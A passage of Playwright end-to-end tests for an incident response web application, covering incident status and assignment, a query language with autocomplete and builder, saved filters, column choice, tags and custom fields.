  await expect(visitor.getByText('Cannot reach the server')).toHaveCount(0)
  await expect(visitor.getByRole('dialog')).toHaveCount(0)
  const before = asked
  await visitor.waitForTimeout(1500)
  expect(asked).toBe(before)
  // Retry asks once more, and says the same while the server does.
  await visitor.getByRole('button', { name: 'Retry' }).click()
  await expect(visitor.getByRole('heading', { name: 'Nik is not running', level: 1 })).toBeVisible()
  expect(asked).toBeGreaterThan(before)
  await visitor.close()
})

test('an incident has a status and an assignee, set from the list and filtered there', async () => {
  const list = page.getByRole('region', { name: 'Incidents' })
  const row = incidentRow('WKS-FINANCE-01')
  const menu = page.getByRole('menu')

  // From the right-click menu of a row of the list.
  await openIncidentList()
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Assign to me' }).click()
  await expect(row).toContainText('@admin')
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Mark as in progress' }).click()
  await expect(row).toContainText('in progress')

  // The Summary shows the same and saves a change; the header follows.
  await row.dblclick()
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
  const details = page.getByRole('article', { name: 'Incident details' })
  await expect(details).toContainText('in progress')
  await expect(details).toContainText('admin')
  await expect(page.getByRole('banner')).toContainText('assigned to admin')
  // The incident itself is changed in its own form, which the details open.
  await details.getByRole('button', { name: 'Edit the incident' }).click()
  const editing = page.getByRole('dialog', { name: 'Edit the incident' })
  await expect(editing.locator('#incident-status')).toHaveValue('in_progress')
  await expect(editing.locator('#incident-assignee')).toHaveValue('admin')
  // The operating system of the host is optional: the one chosen is let go by choosing it again.
  const system = editing.getByRole('group', { name: /^Host operating system/ })
  const linux = system.getByRole('button', { name: 'Linux' })
  await linux.click()
  await expect(linux).toHaveAttribute('aria-pressed', 'true')
  await linux.click()
  await expect(system.locator('[aria-pressed="true"]')).toHaveCount(0)
  await editing.locator('#incident-status').selectOption('closed')
  await editing.getByRole('button', { name: 'Save', exact: true }).click()
  // Closing asks how: a reason among those of the incident's type, and notes.
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toContainText('Unclassified')
  await closing.locator('#close-reason').selectOption('False positive')
  await closing.locator('#close-notes').fill('A test of the scanner.')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing).toHaveCount(0)
  await expect(details).toContainText('closed')
  await expect(details).toContainText('not set')

  // The chips of the list: each writes its condition into the query, and shows the one it wrote.
  await openIncidentList()
  await expect(row).toContainText('closed')
  await list.getByRole('button', { name: 'Status', exact: true }).click()
  await menu.getByRole('menuitem', { name: 'open', exact: true }).click()
  await expect(row).toHaveCount(0)
  await list.getByRole('button', { name: 'Status: status:open' }).click()
  await menu.getByRole('menuitem', { name: 'closed', exact: true }).click()
  await expect(row).toHaveCount(1)
  await list.getByRole('button', { name: 'Owner', exact: true }).click()
  await menu.getByRole('menuitem', { name: 'me (admin)' }).click()
  await expect(row).toHaveCount(1)
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Remove the assignee (admin)' }).click()
  await expect(list).toContainText('No incident matches the filter.')
  await list.getByRole('button', { name: 'Owner: owner:admin' }).click()
  await menu.getByRole('menuitem', { name: 'Take it out of the query' }).click()
  await list.getByRole('button', { name: 'Status: status:closed' }).click()
  await menu.getByRole('menuitem', { name: 'Take it out of the query' }).click()
  await expect(list.getByRole('combobox', { name: 'Filter incidents' })).toHaveValue('')
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Mark as open' }).click()
  await expect(row).not.toContainText('closed')
  await row.dblclick()
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('an incident whose system was taken away is asked for it again', async () => {
  // "Edit the incident" left the system out above: the kinds that need one ask, and the answer puts it back.
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await openEvidence('Browser Forensics')
  const dialog = page.getByRole('dialog', { name: 'Which system is this incident about?' })
  await expect(dialog).toContainText('Browser Forensics cannot be shown without it')
  await dialog.getByRole('button', { name: 'Use Windows' }).click()
  await expect(dialog).toHaveCount(0)
  await expect(page.getByRole('navigation', { name: 'Browser analysis sections' })).toBeVisible()
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.getByRole('article', { name: 'Incident details' })).toContainText('Windows')
})

test('a query filters the lists: typed, completed, built from rows; the filters write it', async () => {
  // The page of the incident list: its query, its chips, its table.
  const panel = page.getByRole('region', { name: 'Incidents' })
  const list = panel.getByRole('table', { name: 'Incidents' })
  const filter = panel.getByRole('combobox', { name: 'Filter incidents' })
  const menu = page.getByRole('menu')
  await openIncidentList()

  // Plain words, then a field with a wildcard: the server reads the query.
  await filter.fill('wks-finance')
  await expect(list.locator('tbody tr')).toHaveCount(1)
  await expect(list).toContainText('WKS-FINANCE-01')
  await expect(panel.getByRole('status', { name: 'Incidents listed' })).toHaveText(/^1 (of \d+|incident)$/)
  await filter.fill('host:nowhere-*')
  await expect(panel).toContainText('No incident matches the filter.')
  await filter.fill('host:wks-* -host:nowhere')
  await expect(list).toContainText('WKS-FINANCE-01')

  // Autocomplete: the fields at the start of a condition, the values after the colon.
  await filter.fill('')
  await filter.pressSequentially('stat')
  const suggestions = panel.getByRole('listbox', { name: 'Suggestions' })
  await expect(suggestions.getByRole('option')).toHaveCount(1)
  await expect(suggestions.getByRole('option').first()).toContainText('status')
  await page.keyboard.press('Enter')
  await expect(filter).toHaveValue('status:')
  await expect(suggestions.getByRole('option')).toHaveText(['open', 'in_progress', 'closed'])
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('Tab')
  await expect(filter).toHaveValue('status:closed ')
  await expect(filter).toBeFocused()
  // The chips show what the query says, and write into it: the status, the owner, any other field.
  await panel.getByRole('button', { name: 'Status: status:closed' }).click()
  await menu.getByRole('menuitem', { name: 'open', exact: true }).click()
  await expect(filter).toHaveValue('status:open')
  await panel.getByRole('button', { name: 'Owner', exact: true }).click()
  await menu.getByRole('menuitem', { name: `me (${ADMIN.username})` }).click()
  await expect(filter).toHaveValue(`status:open owner:${ADMIN.username}`)
  await expect(panel.getByRole('button', { name: `Owner: owner:${ADMIN.username}` })).toBeVisible()
  await panel.getByRole('button', { name: 'Field…' }).click()
  const adding = page.getByRole('dialog', { name: 'Add a condition on a field' })
  await adding.getByLabel('Field').selectOption('host')
  await adding.getByLabel('Operator').selectOption('!')
  await adding.getByLabel('Value').fill('nowhere')
  await adding.getByRole('button', { name: 'Add to the query' }).click()
  await expect(filter).toHaveValue(`status:open owner:${ADMIN.username} !host:nowhere`)
  await filter.fill(`status:open owner:${ADMIN.username}`)

  // The builder: the same query as rows; a change of a row rewrites the text.
  await panel.getByRole('button', { name: 'Query builder' }).click()
  await expect(panel.getByLabel('Condition 1: field')).toHaveValue('status')
  await expect(panel.getByLabel('Condition 2: field')).toHaveValue('owner')
  await panel.getByLabel('Condition 1: value').selectOption('closed')
  await expect(filter).toHaveValue(`status:closed owner:${ADMIN.username}`)
  await panel.getByRole('button', { name: 'Remove Condition 2' }).click()
  await expect(filter).toHaveValue('status:closed')
  await panel.getByRole('button', { name: 'Add a condition' }).click()
  await panel.getByLabel('Condition 2: field').selectOption('severity')
  await panel.getByLabel('Condition 2: operator').selectOption('>=')
  await panel.getByLabel('Condition 2: value').selectOption('high')
  await expect(filter).toHaveValue('status:closed severity:>=high')
  await panel.getByLabel('How the conditions combine').selectOption('or')
  await expect(filter).toHaveValue('status:closed or severity:>=high')
  // What it cannot show, it says; the text stays the query.
  await filter.fill('-(wks or srv)')
  await expect(panel.getByText('Edit it as text.')).toBeVisible()
  await panel.getByRole('button', { name: 'Query builder' }).click()

  // What cannot be read is said where it goes wrong, at once or by the server.
  await filter.fill('(status:open')
  await expect(panel.getByText('A parenthesis is not closed: add the closing )')).toBeVisible()
  await filter.fill('stauts:open')
  await expect(panel.getByText('"stauts" is not a field of incidents: did you mean "status"?')).toBeVisible()
  await expect(filter).toHaveAttribute('aria-invalid', 'true')
  await filter.fill('')
  await expect(filter).not.toHaveAttribute('aria-invalid', 'true')
  await expect(list).toContainText('WKS-FINANCE-01')

  // The artifacts: the same language; "mine" writes its condition.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const artifacts = page.getByRole('complementary', { name: 'Artifacts panel' })
  const artifactFilter = artifacts.getByRole('combobox', { name: 'Filter artifacts' })
  await artifactFilter.fill('kind:file dropper')
  await expect(artifacts.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  await artifacts.getByRole('button', { name: 'mine' }).click()
  await expect(artifactFilter).toHaveValue(`kind:file dropper createdBy:${ADMIN.username}`)
  await artifactFilter.fill('kind:file size:<1')
  await expect(artifacts.getByRole('navigation', { name: 'Artifacts' })).toContainText(
    'No artifact matches these filters.',
  )
  await artifactFilter.fill('knid:file')
  await expect(artifacts.getByText('did you mean "kind"?')).toBeVisible()
  await artifactFilter.fill('')

  // The Indicators page: its pickers write the query too.
  await page
    .getByRole('navigation', { name: 'Sections' })
    .getByRole('button', { name: /^Indicators/ })
    .click()
  await page
    .getByRole('complementary', { name: 'IoCs panel' })
    .getByRole('button', { name: /^All indicators/ })
    .click()
  const indicatorFilter = page.getByRole('combobox', { name: 'Filter indicators' })
  await indicatorFilter.fill('type:ip 185.220.*')
  await expect(page.locator('main tbody tr').first()).toContainText('185.220.101.47')
  await page.locator('main').getByRole('combobox').filter({ hasText: 'All types' }).selectOption('domain')
  await expect(indicatorFilter).toHaveValue('185.220.* type:domain')
  await page.locator('main').getByRole('combobox').filter({ hasText: 'Any verdict' }).selectOption('flagged')
  await expect(indicatorFilter).toHaveValue('185.220.* type:domain verdict:>=suspicious')
  await indicatorFilter.fill('')

  // Back to the incident.
  await openIncidentFromList('WKS-FINANCE-01')
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('the incident list is a page: a click shows the quick view over it, the arrows move, Enter opens', async () => {
  const before = page.url()
  const list = page.getByRole('region', { name: 'Incidents' })
  const table = list.getByRole('table', { name: 'Incidents' })
  const rows = table.locator('tbody tr')
  const quick = page.getByRole('complementary', { name: /^Quick view of incident/ })
  const shown = table.locator('tbody tr[aria-current="true"]')

  // A second incident, so that the arrows have somewhere to go; the list has an address of its own.
  const made = await page.request.post('/api/incidents', {
    data: { id: 'e2e-list', host: 'E2E-LIST', severity: 'high', data: {} },
  })
  expect(made.status()).toBe(201)
  await page.goto('/incidents')
  await expect(rows.nth(1)).toBeVisible()
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeHidden()
  await expect(quick).toHaveCount(0)
  const numberOf = async (row) => (await row.getAttribute('aria-label')).split(' ')[0]
  const [first, second] = [await numberOf(rows.nth(0)), await numberOf(rows.nth(1))]
  expect(first).toMatch(/^#\d{5}$/)

  // A click: the panel lies over the right side of the page, and the table keeps its width.
  const wide = (await table.boundingBox()).width
  await rows.nth(0).click()
  await expect(quick).toHaveAccessibleName(`Quick view of incident ${first}`)
  await expect(shown).toHaveCount(1)
  await expect(rows.nth(0)).toHaveAttribute('aria-current', 'true')
  expect((await table.boundingBox()).width).toBe(wide)
  // What it shows is what the type of the incident says: here, what a type that chose nothing gets.
  for (const title of ['Details', 'Numbers of the evidence', 'Last in the War Room']) {
    await expect(quick.getByRole('heading', { name: title })).toBeVisible()
  }
  await expect(quick.getByRole('region', { name: 'Details' })).toContainText('Owner')
  await expect(quick.getByRole('region', { name: 'Numbers of the evidence' })).toContainText('Flagged')

  // The arrows go to the next row and back, and the panel follows.
  await page.keyboard.press('ArrowDown')
  await expect(quick).toHaveAccessibleName(`Quick view of incident ${second}`)
  await expect(rows.nth(1)).toHaveAttribute('aria-current', 'true')
  await expect(rows.nth(1)).toBeFocused()
  await page.keyboard.press('ArrowUp')
  await expect(quick).toHaveAccessibleName(`Quick view of incident ${first}`)
  // From inside the panel too.
  await quick.getByRole('button', { name: 'Open the incident' }).focus()
  await page.keyboard.press('ArrowDown')
  await expect(quick).toHaveAccessibleName(`Quick view of incident ${second}`)

  // Escape closes it, and so does its button.
  await page.keyboard.press('Escape')
  await expect(quick).toHaveCount(0)
  await expect(shown).toHaveCount(0)
  const mine = rows.filter({ hasText: 'E2E-LIST' })
  await mine.click()
  await quick.getByRole('button', { name: 'Close the quick view' }).click()
  await expect(quick).toHaveCount(0)

  // Its foot: take the incident, close it with the dialog that closes one anywhere.
  await mine.click()
  await quick.getByRole('button', { name: 'Assign to me' }).click()
  await expect(mine).toContainText(`@${ADMIN.username}`)
  await expect(quick.getByRole('button', { name: 'Assign to me' })).toHaveCount(0)
  await quick.getByRole('button', { name: 'Close…' }).click()
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toContainText('E2E-LIST')
  await closing.getByRole('button', { name: 'Cancel' }).click()
  await expect(quick).toBeVisible()

  // Enter on a row opens the incident, like a double click and "Open the incident".
  await mine.focus()
  await page.keyboard.press('Enter')
  await expect(page).toHaveURL(/\/incident\/e2e-list$/)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
  await openIncidentList()
  await mine.click()
  await quick.getByRole('button', { name: 'Open the incident' }).click()
  await expect(page).toHaveURL(/\/incident\/e2e-list$/)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('the incident list: a filter is saved, opens the list as the default, and the columns are chosen', async () => {
  const before = page.url()
  const list = page.getByRole('region', { name: 'Incidents' })
  const table = list.getByRole('table', { name: 'Incidents' })
  const rows = table.locator('tbody tr')
  const filter = list.getByRole('combobox', { name: 'Filter incidents' })
  const menu = page.getByRole('menu', { name: 'Saved filters' })
  const headings = table.locator('thead th')
  const usual = ['#', 'Title', 'Tags', 'Type', 'Severity', 'Status', 'Owner', 'Opened', 'Updated', 'Actions']
  const tagged = await page.request.patch('/api/incidents/e2e-list/fields', {
    data: { changes: { category: 'e2e-cat' } },
  })
  expect(tagged.status()).toBe(200)

  // The query on screen is saved under a name, and the filter is the one that is chosen.
  await openIncidentList()
  await expect(list.getByRole('button', { name: 'Filter: none' })).toBeVisible()
  await filter.fill('host:e2e-list')
  await expect(rows).toHaveCount(1)
  await list.getByRole('button', { name: 'Save the filter…' }).click()
  const saving = page.getByRole('dialog', { name: 'Save the filter' })
  await expect(saving).toContainText('host:e2e-list')
  await saving.getByLabel('Name').fill('E2E only')
  await saving.getByRole('button', { name: 'Save the filter' }).click()
  await expect(saving).toHaveCount(0)
  const chosen = list.getByRole('button', { name: 'Filter: E2E only' })
  await expect(chosen).toBeVisible()

  // Another query than the one it keeps is marked, and undone.
  await filter.fill('host:e2e-list severity:high')
  await expect(list.getByText('changed since saved')).toBeVisible()
  await list.getByRole('button', { name: 'Back to the saved one' }).click()
  await expect(filter).toHaveValue('host:e2e-list')
  await expect(list.getByText('changed since saved')).toHaveCount(0)

  // The default: what the list opens with, for this person.
  await chosen.click()
  await expect(menu.getByRole('menuitem', { name: 'E2E only', exact: true })).toBeVisible()
  await menu.getByRole('menuitem', { name: 'Set E2E only as default' }).click()
  await expect(menu.getByRole('menuitem', { name: 'Set no filter as default' })).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)
  await page.reload()
  await expect(chosen).toBeVisible()
  await expect(filter).toHaveValue('host:e2e-list')
  await expect(rows).toHaveCount(1)

  // The columns: one taken away, a field of the registry added and moved; the filter says it changed.
  await expect(headings).toHaveText(usual)
  await list.getByRole('button', { name: 'Columns…' }).click()
  const columns = page.getByRole('dialog', { name: 'Columns' })
  await columns.getByRole('checkbox', { name: 'Owner', exact: true }).click()
  await columns.getByRole('checkbox', { name: /^Category/ }).click()
  await columns.getByRole('button', { name: 'Move Category up' }).click()
  await expect(headings).toHaveText([
    '#',
    'Title',
    'Tags',
    'Type',
    'Severity',
    'Status',
    'Opened',
    'Category',
    'Updated',
    'Actions',
  ])
  await expect(rows.first()).toContainText('e2e-cat')
  await columns.getByRole('button', { name: 'Done' }).click()
  await expect(list.getByText('changed since saved')).toBeVisible()
  // A click on a heading orders the list by it.
  await table.getByRole('button', { name: 'Sort by Title' }).click()
  await expect(headings.nth(1)).toHaveAttribute('aria-sort', 'ascending')
  await list.getByRole('button', { name: 'Back to the saved one' }).click()
  await expect(headings).toHaveText(usual)
  await list.getByRole('button', { name: 'Columns…' }).click()
  await columns.getByRole('button', { name: 'Back to the default columns' }).click()
  await columns.getByRole('button', { name: 'Done' }).click()
  await expect(headings).toHaveText(usual)

  // Put back: no default, the filter shared (an administrator may) then deleted, the list with no filter.
  await chosen.click()
  await menu.getByRole('menuitem', { name: 'Set no filter as default' }).click()
  await expect(menu.getByRole('menuitem', { name: 'Set E2E only as default' })).toBeVisible()
  await menu.getByRole('menuitem', { name: /^Manage the filters/ }).click()
  const managing = page.getByRole('dialog', { name: 'Manage the filters' })
  const share = managing.getByRole('checkbox', { name: 'Share E2E only with everyone' })
  await share.click()
  await expect(share).toBeChecked()
  await managing.getByRole('button', { name: 'Delete E2E only' }).click()
  await managing.getByRole('button', { name: 'Delete it' }).click()
  await expect(managing).toContainText('Nothing here yet.')
  await managing.getByRole('button', { name: 'Done' }).click()
  await list.getByRole('button', { name: 'Filter: none' }).click()
  await menu.getByRole('menuitem', { name: 'All incidents (no filter)' }).click()
  await expect(filter).toHaveValue('')
  expect((await (await page.request.get('/api/filters')).json()).filters).toEqual([])
  expect((await page.request.delete('/api/incidents/e2e-list')).status()).toBe(204)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('incidents have tags: put on from the incident, a column of the list, asked by the Tag chip and by tag:, taken off in the quick view', async () => {
  const before = page.url()
  const list = page.getByRole('region', { name: 'Incidents' })
  const table = list.getByRole('table', { name: 'Incidents' })
  const rows = table.locator('tbody tr')
  const filter = list.getByRole('combobox', { name: 'Filter incidents' })
  const menu = page.getByRole('menu')
  const found = await (await page.request.get('/api/incidents?view=summary&q=host:WKS-FINANCE-01')).json()
  const incidentId = found.incidents[0].id
  const tagsOf = async (id) => (await (await page.request.get(`/api/incidents/${id}/fields`)).json()).fields.labels
  // A second incident that carries one of the two tags: the counts of the chip differ.
  const made = await page.request.post('/api/incidents', { data: { id: 'e2e-tags', host: 'E2E-TAGS', data: {} } })
  expect(made.status()).toBe(201)

  // On the page of the incident: "+" opens an input, Enter adds; capitals and spaces are made a tag.
  await page.goto(`/incident/${incidentId}`)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
  const own = page.getByRole('banner').getByRole('group', { name: 'Tags' })
  await own.getByRole('button', { name: 'Add a tag' }).click()
  const typing = own.getByRole('combobox', { name: 'New tag' })
  await expect(typing).toBeFocused()
  await typing.fill('E2E Phish')
  await typing.press('Enter')
  await expect(own).toContainText('#e2e-phish')
  // What is not a tag is refused where it was typed, with the rule.
  await typing.fill('no/slash')
  await typing.press('Enter')
  await expect(own.getByRole('alert')).toContainText('A tag is a letter or a digit')
  await typing.fill('e2e-vip')
  await typing.press('Enter')
  await expect(own).toContainText('#e2e-vip')
  await expect(own.getByRole('alert')).toHaveCount(0)
  await typing.press('Escape')
  await expect(typing).toHaveCount(0)
  await expect.poll(() => tagsOf(incidentId)).toEqual(['e2e-phish', 'e2e-vip'])
  // Each change left the trace a field change leaves.
  const trace = await (await page.request.get('/api/audit?q=action:incident.field details:Tags')).json()
  expect(trace.entries[0].details).toBe('Set Tags: ["e2e-phish"] → ["e2e-phish", "e2e-vip"]')

  // The list: a column of chips. The menu of a row tags another incident, offering the tags in use.
  await openIncidentList()
  const row = incidentRow('WKS-FINANCE-01')
  const other = rows.filter({ hasText: 'E2E-TAGS' })
  await expect(table.locator('thead th').nth(2)).toHaveText('Tags')
  await expect(row.getByRole('button', { name: 'Filter by the tag e2e-phish' })).toBeVisible()
  await expect(row.getByRole('button', { name: 'Filter by the tag e2e-vip' })).toBeVisible()
  await other.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Add a tag…' }).click()
  const tagging = page.getByRole('dialog', { name: /^Tags of #\d+/ })
  const adding = tagging.getByRole('combobox', { name: 'New tag' })
  await adding.fill('e2e-p')
  await expect(tagging.getByRole('option')).toHaveText(['#e2e-phish'])
  await adding.press('ArrowDown')
  await adding.press('Enter')
  await expect(tagging.getByRole('group', { name: 'Tags' })).toContainText('#e2e-phish')
  // Backspace in the empty input takes the last one off; it is put back for what follows.
  await adding.fill('e2e-other')
  await adding.press('Enter')
  await expect(tagging.getByRole('button', { name: 'Remove the tag e2e-other' })).toBeVisible()
  await adding.press('Backspace')
  await expect(tagging.getByRole('button', { name: 'Remove the tag e2e-other' })).toHaveCount(0)
  await tagging.getByRole('button', { name: 'Done' }).click()
  await expect(tagging).toHaveCount(0)
  await expect(other.getByRole('button', { name: 'Filter by the tag e2e-phish' })).toBeVisible()
  await expect.poll(() => tagsOf('e2e-tags')).toEqual(['e2e-phish'])

  // The Tag chip lists the tags in use with how many incidents carry each, and writes tag:<value>.
  await list.getByRole('button', { name: 'Tag', exact: true }).click()
  await expect(menu.getByRole('menuitem', { name: /#e2e-phish/ })).toHaveText(/#e2e-phish\s*2$/)
  await expect(menu.getByRole('menuitem', { name: /#e2e-vip/ })).toHaveText(/#e2e-vip\s*1$/)
  await menu.getByRole('menuitem', { name: /#e2e-phish/ }).click()
  await expect(filter).toHaveValue('tag:e2e-phish')
  await expect(rows).toHaveCount(2)
  // A click on a tag of a row adds it: several tags keep the incidents that carry all of them.
  await row.getByRole('button', { name: 'Filter by the tag e2e-vip' }).click()
  await expect(filter).toHaveValue('tag:e2e-phish tag:e2e-vip')
  await expect(rows).toHaveCount(1)
  await list.getByRole('button', { name: 'Tag: tag:e2e-phish tag:e2e-vip' }).click()
  await expect(menu.getByRole('menuitem', { name: /#e2e-vip/ })).toContainText('in the query')
  await menu.getByRole('menuitem', { name: 'Take the tags out of the query' }).click()
  await expect(filter).toHaveValue('')
  // Typed: tag: completes with the tags in use; labels: is the same field.
  await filter.pressSequentially('tag:e2e-v')
  const suggestions = list.getByRole('listbox', { name: 'Suggestions' })
  await expect(suggestions.getByRole('option')).toHaveText(['e2e-vip'])
  await page.keyboard.press('Enter')
  await expect(filter).toHaveValue('tag:e2e-vip ')
  await expect(rows).toHaveCount(1)
  await expect(row).toBeVisible()
  await filter.fill('labels:E2E-PHISH -tags:e2e-vip')
  await expect(rows).toHaveCount(1)
  await expect(other).toBeVisible()
  await filter.fill('')
  await expect(rows.nth(1)).toBeVisible()

  // The quick view shows them, and takes one off; the row follows.
  await row.locator('td').nth(3).click()
  const quick = page.getByRole('complementary', { name: /^Quick view of incident/ })
  const quickTags = quick.getByRole('group', { name: 'Tags' })
  await expect(quickTags).toContainText('#e2e-phish')
  await quickTags.getByRole('button', { name: 'Remove the tag e2e-vip' }).click()
  await expect(quickTags).not.toContainText('#e2e-vip')
  await expect(row.getByRole('button', { name: 'Filter by the tag e2e-vip' })).toHaveCount(0)
  await expect.poll(() => tagsOf(incidentId)).toEqual(['e2e-phish'])
  // Escape in the input of a tag closes the input, not the quick view.
  await quickTags.getByRole('button', { name: 'Add a tag' }).click()
  await quickTags.getByRole('combobox', { name: 'New tag' }).press('Escape')
  await expect(quickTags.getByRole('combobox', { name: 'New tag' })).toHaveCount(0)
  await expect(quick).toBeVisible()
  await quick.getByRole('button', { name: 'Close the quick view' }).click()
  await expect(quick).toHaveCount(0)

  // Put back: the incident with no tag, the other one deleted.
  const cleared = await page.request.patch(`/api/incidents/${incidentId}/fields`, {
    data: { changes: { labels: null } },
  })
  expect(cleared.status()).toBe(200)
  expect((await page.request.delete('/api/incidents/e2e-tags')).status()).toBe(204)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
  await expect(page.getByRole('banner').getByRole('group', { name: 'Tags' })).not.toContainText('#e2e-phish')
})

test('a custom field is asked like any other: the query box, "Field…", a saved filter, a chart of a page', async () => {
  test.setTimeout(120_000)
  const before = page.url()
  const post = async (path, data) => {
    const answer = await page.request.post(path, { data })
    expect(answer.status(), await answer.text()).toBe(201)
    return answer.json()
  }
  await post('/api/fields', { name: 'e2e_customer', label: 'Customer of the incident', type: 'text', allTypes: true })
  await post('/api/incident-types', { name: 'E2E query' })
  for (const [id, customer] of [
    ['e2e-q1', 'Acme Corp'],
    ['e2e-q2', 'Globex'],
  ]) {
    await post('/api/incidents', { id, name: id.toUpperCase(), host: id.toUpperCase(), data: {} })
    const held = await page.request.patch(`/api/incidents/${id}/fields`, {
      data: { changes: { type: 'e2e-query', e2e_customer: customer } },
    })
    expect(held.status(), await held.text()).toBe(200)
  }
  const board = await post('/api/dashboards', {
    name: 'E2E query board',
    widgets: [{ id: 'all', title: 'All of them', type: 'number', entity: 'incidents' }],
  })
  await page.reload() // the registry is read as the app opens: the field was made behind its back
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()

  // The query box offers the field with what Settings calls it, and the server reads the condition.
  const list = page.getByRole('region', { name: 'Incidents' })
  const rows = list.getByRole('table', { name: 'Incidents' }).locator('tbody tr')
  const filter = list.getByRole('combobox', { name: 'Filter incidents' })
  const menu = page.getByRole('menu', { name: 'Saved filters' })
  await openIncidentList()
  await expect(list.getByRole('button', { name: 'Field…' })).toBeEnabled() // the fields a query can ask were read
  await filter.fill('')
  await filter.pressSequentially('e2e_cu')
  const suggestions = list.getByRole('listbox', { name: 'Suggestions' })
  await expect(suggestions.getByRole('option')).toHaveCount(1)
  await expect(suggestions.getByRole('option').first()).toContainText('e2e_customer')
  await expect(suggestions.getByRole('option').first()).toContainText('Customer of the incident')
  await page.keyboard.press('Enter')
  await expect(filter).toHaveValue('e2e_customer:')
  await filter.pressSequentially('acme')
  await expect(rows).toHaveCount(1)
  await expect(rows.first()).toContainText('E2E-Q1')
  await filter.fill('e2e_customer:* !e2e_customer:acme')
  await expect(rows).toHaveCount(1)
  await expect(rows.first()).toContainText('E2E-Q2')

  // "Field…" lists it with the operators of a text, and writes the same condition.
  await filter.fill('')
  await list.getByRole('button', { name: 'Field…' }).click()
  const adding = page.getByRole('dialog', { name: 'Add a condition on a field' })
  await expect(adding.getByLabel('Field').locator('option[value="e2e_customer"]')).toHaveText(
    'e2e_customer · Customer of the incident',
  )
  await adding.getByLabel('Field').selectOption('e2e_customer')
  await expect(adding.getByLabel('Operator').locator('option')).toHaveText([
    'contains',
    'does not contain',
    'is empty',
    'holds something',
  ])
  await adding.getByLabel('Value').fill('globex')
  await adding.getByRole('button', { name: 'Add to the query' }).click()
  await expect(filter).toHaveValue('e2e_customer:globex')
  await expect(rows).toHaveCount(1)
  await expect(rows.first()).toContainText('E2E-Q2')

  // The filter is saved with it.
  await list.getByRole('button', { name: 'Save the filter…' }).click()
  const saving = page.getByRole('dialog', { name: 'Save the filter' })
  await expect(saving).toContainText('e2e_customer:globex')
  await saving.getByLabel('Name').fill('E2E Globex')
  await saving.getByRole('button', { name: 'Save the filter' }).click()
  await expect(saving).toHaveCount(0)
  const chosen = list.getByRole('button', { name: 'Filter: E2E Globex' })
  await expect(chosen).toBeVisible()
  const kept = (await (await page.request.get('/api/filters')).json()).filters
  expect(kept.map((item) => item.query)).toEqual(['e2e_customer:globex'])
  await chosen.click()
  await menu.getByRole('menuitem', { name: /^Manage the filters/ }).click()
  const managing = page.getByRole('dialog', { name: 'Manage the filters' })
  await managing.getByRole('button', { name: 'Delete E2E Globex' }).click()
  await managing.getByRole('button', { name: 'Delete it' }).click()
  await expect(managing).toContainText('Nothing here yet.')
  await managing.getByRole('button', { name: 'Done' }).click()
  await list.getByRole('button', { name: 'Filter: none' }).click()
  await menu.getByRole('menuitem', { name: 'All incidents (no filter)' }).click()
  await expect(filter).toHaveValue('')

  // A chart of a page is narrowed by it: the setting lists every field a query can ask.
  const settings = await openTypePages('E2E query')
  const arranged = settings.getByRole('region', { name: 'The page' })
  await arranged.locator('#page-add-kind').selectOption('chart')
  await arranged.getByRole('button', { name: 'Add', exact: true }).click()
  await arranged.getByRole('button', { name: 'Edit Chart of a dashboard' }).click()
  const widget = page.getByRole('dialog', { name: 'Widget: Chart of a dashboard' })
  await widget.locator('#chart-dashboard').selectOption(board.id)
  await widget.locator('#chart-widget').selectOption('all')
  await expect(widget.locator('#chart-field').locator('option[value="e2e_customer"]')).toHaveText(
    'e2e_customer · Customer of the incident',
  )
  await widget.locator('#chart-field').selectOption('e2e_customer')
  await widget.getByRole('button', { name: 'Done' }).click()
  await settings.getByRole('button', { name: 'Save the type' }).click()
  await expect(settings.getByText('not saved')).toHaveCount(0)
  const narrowed = await (
    await page.request.get(`/api/incidents/e2e-q1/chart?dashboard=${board.id}&widget=all&field=e2e_customer`)
  ).json()
  expect(narrowed.widget.query).toBe('e2e_customer:"Acme Corp"')
  const counted = await page.request.post('/api/query/aggregate', {
    data: { entity: 'incidents', query: narrowed.widget.query },
  })
  expect((await counted.json()).total).toBe(1)
  await page.goto('/incident/e2e-q1')
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
  const summary = page.getByRole('region', { name: 'Summary of the incident' })
  await expect(summary).toContainText('E2E query board · narrowed to e2e_customer: Acme Corp')

  // Put back: the incidents, the type, the dashboard, then the field nothing holds any more.
  for (const id of ['e2e-q1', 'e2e-q2']) expect((await page.request.delete(`/api/incidents/${id}`)).status()).toBe(204)
  expect((await page.request.delete('/api/incident-types/e2e-query')).status()).toBe(204)
  expect((await page.request.delete(`/api/dashboards/${board.id}`)).ok()).toBe(true)
  expect((await page.request.delete('/api/fields/e2e_customer')).status()).toBe(204)
  // The field is gone: a query that names it says so, as for a name that was never one.
  const gone = await page.request.get('/api/incidents?view=summary&q=e2e_customer:acme')
  expect(gone.status()).toBe(422)
